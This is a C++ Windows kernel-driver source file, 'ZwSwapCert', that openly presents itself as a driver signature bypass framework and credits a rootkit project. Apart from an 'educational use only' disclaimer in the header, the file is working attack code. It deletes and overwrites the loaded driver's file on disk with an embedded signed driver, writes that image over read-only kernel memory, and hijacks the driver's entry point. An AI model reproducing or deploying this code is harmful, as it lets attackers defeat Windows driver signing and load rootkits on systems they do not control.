/*
 * ZwSwapCert - Windows Driver Signature Bypass Framework
 * 
 * Copyright (c) 2024 Daku/beimaan & CruzX
 * All rights reserved.
 * 
 * This software is provided for educational and research purposes only.
 * The authors do not condone or support the use of this software for 
 * malicious purposes or illegal activities.
 * 
 * Reference Credits:
 * - Chaos-Rootkit: https://github.com/ZeroMemoryEx/Chaos-Rootkit
 *   Techniques and methodologies inspired by the Chaos-Rootkit project
 * 
 * Permission is hereby granted, free of charge, to any person obtaining
 * a copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 * 
 * Educational Use Only - This code demonstrates Windows kernel security
 * research techniques and should only be used for legitimate security
 * research, education, and authorized testing purposes.
 */

#include "RawDriver.hpp"
#include "ZwSwapCert.hpp"

extern "C" UNICODE_STRING DriverPath;
extern "C" FILE_STANDARD_INFORMATION fileInfo;
extern "C" PVOID FileCopy;
extern "C" HANDLE fileHandle;
extern "C" PIMAGE_DOS_HEADER originalHeaders;
extern "C" SIZE_T textSize;
extern "C" PVOID driverStartSaved;
extern "C" PVOID originalTextSection;
extern "C" PVOID TextSectionAddress;
extern "C" DWORD SizeOfRawData;
extern "C" PVOID PeBuckup;
extern "C" SIZE_T DriverSize;

UNICODE_STRING DriverPath = {};
FILE_STANDARD_INFORMATION fileInfo = {};
PVOID FileCopy = NULL;
HANDLE fileHandle = NULL;
PIMAGE_DOS_HEADER originalHeaders = NULL;
SIZE_T textSize = 0;
PVOID driverStartSaved = NULL;
PVOID originalTextSection = NULL;
PVOID TextSectionAddress = NULL;
DWORD SizeOfRawData = 0;
PVOID PeBuckup = NULL;
SIZE_T DriverSize = 0;

DWORD write_to_read_only_memory(void* address, void* buffer, size_t size)
{
	if (address == NULL || buffer == NULL || size == 0)
		return STATUS_INVALID_PARAMETER;

	PMDL Mdl = IoAllocateMdl(address, (ULONG)size, FALSE, FALSE, NULL);
	if (Mdl == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;

	MmBuildMdlForNonPagedPool(Mdl);

	__try
	{
		PVOID MappedAddress = MmMapLockedPagesSpecifyCache(
			Mdl,
			KernelMode,
			MmCached,
			NULL,
			FALSE,
			NormalPagePriority);

		if (MappedAddress == NULL)
		{
			IoFreeMdl(Mdl);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		RtlCopyMemory(MappedAddress, buffer, size);

		MmUnmapLockedPages(MappedAddress, Mdl);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		IoFreeMdl(Mdl);
		return GetExceptionCode();
	}

	IoFreeMdl(Mdl);
	return STATUS_SUCCESS;
}

int GetPeHdrSize()
{
	if (driverStartSaved == NULL)
		return 0;

	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)driverStartSaved;
	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
		return 0;

	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)driverStartSaved + dosHeaders->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	return (int)ntHeaders->OptionalHeader.SizeOfHeaders;
}

void RestoreFileInDeskAndFreeMemory()
{
	__try
	{
		if (FileCopy != NULL && DriverPath.Buffer != NULL && fileInfo.EndOfFile.QuadPart > 0)
		{
			IO_STATUS_BLOCK IOBlock = {};
			OBJECT_ATTRIBUTES FileAttributes = {};
			HANDLE Handle = NULL;

			InitializeObjectAttributes(&FileAttributes,
				&DriverPath,
				OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
				NULL,
				NULL);

			if (NT_SUCCESS(ZwCreateFile(
				&Handle,
				GENERIC_WRITE,
				&FileAttributes,
				&IOBlock,
				NULL,
				FILE_ATTRIBUTE_NORMAL,
				FILE_SHARE_READ,
				FILE_OVERWRITE_IF,
				FILE_SYNCHRONOUS_IO_NONALERT,
				NULL,
				0)))
			{
				IO_STATUS_BLOCK WriteBlock = {};
				ZwWriteFile(Handle, NULL, NULL, NULL, &WriteBlock,
					FileCopy, (ULONG)fileInfo.EndOfFile.QuadPart, NULL, NULL);
				ZwClose(Handle);
			}
		}

		if (FileCopy != NULL)
		{
			ExFreePool(FileCopy);
			FileCopy = NULL;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("RestoreFileInDeskAndFreeMemory: 0x%08X\n", GetExceptionCode());
	}
}

void PrepareDriverForUnload()
{
	__try
	{
		if (TextSectionAddress && originalTextSection && SizeOfRawData)
		{
			write_to_read_only_memory(TextSectionAddress, originalTextSection, SizeOfRawData);
		}

		if (originalHeaders && driverStartSaved)
		{
			write_to_read_only_memory(driverStartSaved, originalHeaders, GetPeHdrSize());
		}
	}
	__finally
	{
		if (originalHeaders)
		{
			ExFreePool(originalHeaders);
			originalHeaders = NULL;
		}

		if (originalTextSection)
		{
			ExFreePool(originalTextSection);
			originalTextSection = NULL;
		}

		if (PeBuckup)
		{
			ExFreePool(PeBuckup);
			PeBuckup = NULL;
		}

		RestoreFileInDeskAndFreeMemory();
	}
}

NTSTATUS Utils::SwapDriver(PUNICODE_STRING DriverPath, PVOID DriverBuffer, SIZE_T BufferSize)
{
	HANDLE Handle;
	NTSTATUS Status;
	IO_STATUS_BLOCK IOBlock;
	PDEVICE_OBJECT DeviceObject = nullptr;
	PFILE_OBJECT FileObject = nullptr;
	OBJECT_ATTRIBUTES FileAttributes;

	RtlZeroMemory(&IOBlock, sizeof IOBlock);
	InitializeObjectAttributes(&FileAttributes,
		DriverPath,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL);

	if ((Status = IoCreateFileSpecifyDeviceObjectHint(
		&Handle,
		SYNCHRONIZE | FILE_WRITE_ATTRIBUTES | FILE_READ_ATTRIBUTES | FILE_READ_DATA,
		&FileAttributes,
		&IOBlock,
		NULL,
		NULL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		NULL,
		CreateFileTypeNone,
		NULL,
		IO_IGNORE_SHARE_ACCESS_CHECK,
		DeviceObject)) != STATUS_SUCCESS)
		return Status;

	fileHandle = Handle;

	RtlZeroMemory(&IOBlock, sizeof IOBlock);
	if ((Status = ZwQueryInformationFile(Handle, &IOBlock, &fileInfo,
		sizeof fileInfo, FileStandardInformation)) != STATUS_SUCCESS)
	{
		ZwClose(Handle);
		return Status;
	}

	if (fileInfo.EndOfFile.QuadPart > 0)
	{
		FileCopy = ExAllocatePool2(POOL_FLAG_NON_PAGED, (SIZE_T)fileInfo.EndOfFile.QuadPart, 'vZwp');
		if (!FileCopy)
		{
			ZwClose(Handle);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		RtlZeroMemory(&IOBlock, sizeof IOBlock);
		if ((Status = ZwReadFile(Handle, NULL, NULL, NULL, &IOBlock,
			FileCopy, (ULONG)fileInfo.EndOfFile.QuadPart, NULL, NULL)) != STATUS_SUCCESS)
		{
			ExFreePool(FileCopy);
			FileCopy = NULL;
			ZwClose(Handle);
			return Status;
		}
	}

	if ((Status = ObReferenceObjectByHandle(Handle, NULL, NULL, NULL, (PVOID*)&FileObject, NULL)) != STATUS_SUCCESS)
	{
		ZwClose(Handle);
		return Status;
	}

	FileObject->SectionObjectPointer->ImageSectionObject = 0;
	FileObject->DeleteAccess = 1;
	if ((Status = ZwDeleteFile(&FileAttributes)) != STATUS_SUCCESS)
		return Status;

	ObDereferenceObject(FileObject);
	if ((Status = ZwClose(Handle)) != STATUS_SUCCESS)
		return Status;

	RtlZeroMemory(&IOBlock, sizeof IOBlock);
	InitializeObjectAttributes(&FileAttributes, DriverPath,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL, NULL);

	if ((Status = ZwCreateFile(
		&Handle,
		GENERIC_WRITE,
		&FileAttributes,
		&IOBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		NULL,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		NULL
	)) != STATUS_SUCCESS)
		return Status;

	if ((Status = ZwWriteFile(
		Handle,
		NULL,
		NULL,
		NULL,
		&IOBlock,
		DriverBuffer,
		(ULONG)BufferSize,
		NULL,
		NULL
	)) != STATUS_SUCCESS)
		return Status;

	return ZwClose(Handle);
}

PVOID Utils::MapDriver(UINT64 ModuleBase, UINT64 DriverBuffer)
{
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)DriverBuffer;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(DriverBuffer + dosHeaders->e_lfanew);

	if (originalHeaders == NULL && driverStartSaved != NULL && GetPeHdrSize() > 0)
	{
		originalHeaders = (PIMAGE_DOS_HEADER)ExAllocatePool2(POOL_FLAG_NON_PAGED, GetPeHdrSize(), 'HdrB');
		if (originalHeaders)
			RtlCopyMemory(originalHeaders, (PVOID)driverStartSaved, GetPeHdrSize());
	}

	PIMAGE_SECTION_HEADER sections =
		(PIMAGE_SECTION_HEADER)((UINT8*)&ntHeaders->OptionalHeader +
			ntHeaders->FileHeader.SizeOfOptionalHeader);

	for (UINT32 i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, ".text", 5) == 0)
		{
			originalTextSection = ExAllocatePool2(POOL_FLAG_NON_PAGED, section->SizeOfRawData, 'HdwB');
			if (!originalTextSection)
			{
				DbgPrint("failed to allocate address of original bytes\n");
				return (PVOID)NULL;
			}
			memcpy(originalTextSection, (PVOID)(ModuleBase + section->VirtualAddress), section->SizeOfRawData);
			TextSectionAddress = (PVOID)(ModuleBase + section->VirtualAddress);
			SizeOfRawData = section->SizeOfRawData;
			textSize = section->SizeOfRawData;
			break;
		}
	}

	DWORD Result = write_to_read_only_memory((PVOID)ModuleBase, (PVOID)DriverBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
	if (Result != STATUS_SUCCESS)
		return (PVOID)NULL;

	for (UINT32 i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER section = &sections[i];
		Result = write_to_read_only_memory(
			(PVOID)(ModuleBase + section->VirtualAddress),
			(PVOID)(DriverBuffer + section->PointerToRawData),
			section->SizeOfRawData);
		if (Result != STATUS_SUCCESS)
			return (PVOID)NULL;
	}

	return (PVOID)(ModuleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
}

NTSTATUS ScDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	driverStartSaved = DriverObject->DriverStart;
	DriverSize = DriverObject->DriverSize;

	NTSTATUS Result;
	if ((Result = IoQueryFullDriverPath(DriverObject, &DriverPath)) != STATUS_SUCCESS)
		return Result;

	if ((Result = Utils::SwapDriver(&DriverPath, RawDriver, RAWDRIVER_FILE_SIZE)) != STATUS_SUCCESS)
	{
		DbgPrint("swapdriver failed 0x%08X\n", Result);
		return Result;
	}

	PeBuckup = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof RawDriver, 'zVSP');
	if (!PeBuckup)
		return STATUS_INSUFFICIENT_RESOURCES;

	memcpy(PeBuckup, RawDriver, sizeof RawDriver);
	PDRIVER_INITIALIZE SignedDriverEntry = (PDRIVER_INITIALIZE)
		Utils::MapDriver((UINT64)DriverObject->DriverStart, (UINT64)PeBuckup);

	ExFreePool(PeBuckup);
	PeBuckup = NULL;

	if (SignedDriverEntry == NULL)
		return STATUS_UNSUCCESSFUL;

	DriverObject->DriverSize = sizeof RawDriver;
	DriverObject->DriverInit = SignedDriverEntry;

	return DriverEntry(DriverObject, RegistryPath);
}